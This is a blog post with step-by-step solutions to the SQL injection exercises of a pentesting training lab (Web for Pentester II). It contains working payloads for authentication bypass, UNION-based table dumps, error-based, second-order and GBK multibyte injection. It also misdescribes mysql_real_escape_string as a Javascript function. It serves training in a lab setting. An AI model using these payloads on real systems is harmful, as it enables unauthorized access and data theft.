---
layout: post
title: Web for Pentester II - SQL Injection
date: 2015-08-20 
author: yzh503
summary: All the solutions of SQL injection part of Web for Pentester II
categories: Web_Penetration
tags: 
 - Web penetration
 - SQL injection
---

##  Background 
SQL injection is a type of vulnerabilities of SQL syntax. Based on SQL commands knowledgement, you can insert your own query into the origin code to bypass the authentication page or to get sensitive information. There are a bunch of good free examples for web penetration testing in [Pentester Lab](http://pentesterlab.com). In this article, we will go through each example of SQL injection in [Web for Pentester II](https://pentesterlab.com/exercises/web_for_pentester_II). Make sure you give the VM at least 1 GB of RAM, and host-only network. OK, now open the page and get started, Using nmap or typing ifconfig in the VM to get the IP. 

##  Solutions 
### Example 1
It's pretty straightforward. Use the very basic injection technique. Type the following in the username. As the course of pentester lab stated, password is usually hashed or encrypted, so it's better to perform this in username.
{% highlight sql %}
' or 1=1 #
{% endhighlight %}
Note that assume the original query is like
{% highlight sql%}
SELECT * FROM users WHERE username='******' AND password='******'
{% endhighlight %}
single quote ' can be used to escape from string, and insert query. After we send the request, the query would be like 
{% highlight sql%}
SELECT * FROM users WHERE username='' or 1=1 # ' AND password=''
{% endhighlight %}
The WHERE clause became always true, and things after # was commented out, so then the server got a result, and we are done.


### Example 2
In this example, the number of users returned is restricted.
{% highlight sql %}
' or 1=1 LIMIT 1 #
{%endhighlight%}


### Example 3
In this example, single quotes are removed in the query, but it's still breakable by using '\'. The query will become like
{% highlight sql %}
SELECT * FROM users WHERE username='\' AND password=' or 1=1 #'
{%endhighlight%}
The second single quote is turned to a character by backslash. The actual username in the query is "\' AND password=". The string is closed by the first quote of password.

### Example 4
There is no text box, so look at the address bar. 
{% highlight sql %}
.../example4/?req=username%3d%27hacker%27
{% endhighlight  %}
Decode the url, 
{% highlight sql %}
username='hacker'
{% endhighlight %}
This gives the server a username, and this string is likely to be in WHERE clause. To confirm this, change the url to
{% highlight sql %}
.../example4/?req=username='
{% endhighlight %}
This gives you an sql query error, which shows the actual query. The entire string after "req=" is in WHERE clause. Chagne the url to this.
{% highlight sql %}
.../example4/?req=' or 1=1 #
{% endhighlight %}


### Example 5
This is a union-based SQL injection.
{%highlight sql%}
.../example5/?limit=3 union all select * from users
{%endhighlight%}


###Example 6 
Change the url to
{%highlight sql%}
.../example5/?group=username union all select * from users
{%endhighlight%}
or simple delete group
{%highlight sql%}
.../example5/?
{%endhighlight%}
This is a dump example using group by.


### Example 7
Pentester lab provides an error-pone statement, 
{%highlight sql%}
extractvalue('%3Cxml%3E',concat(%22/%22,(select%20version())))
{%endhighlight%}
but I prefer to just use a single quote here, which has the same result on web for pentester II pages.
With an error message displayed, you can easily see the structure of the query.
![msg](http://i.imgur.com/1iWLWTB.png) 
Same as example 6, delete suffix or use union-based injection to display all users.


### Example 8
Create a few users randomly first. Create a new user named the following:
{%highlight sql%}
' union all select * from users where username='whatever_you_want_to_check' #
or 
' union all select * from users where id='whichever_you_want_to_check' #
{%endhighlight%}
With this user, you may check any user you want. The vulnerability of this one is that the value coming crom database is usually seen as trustable.


### Example 9
This page uses a Javascript function  mysql_real_escape_string(), which removes any escape that you enter in. However, this function does not work properly with GBK character. with a GBK character, followed by a single quote, this quote will not be removed. Enter the following to bypass the authentication.
{%highlight sql%}
å‘µ' or 1=1 #
{%endhighlight%}



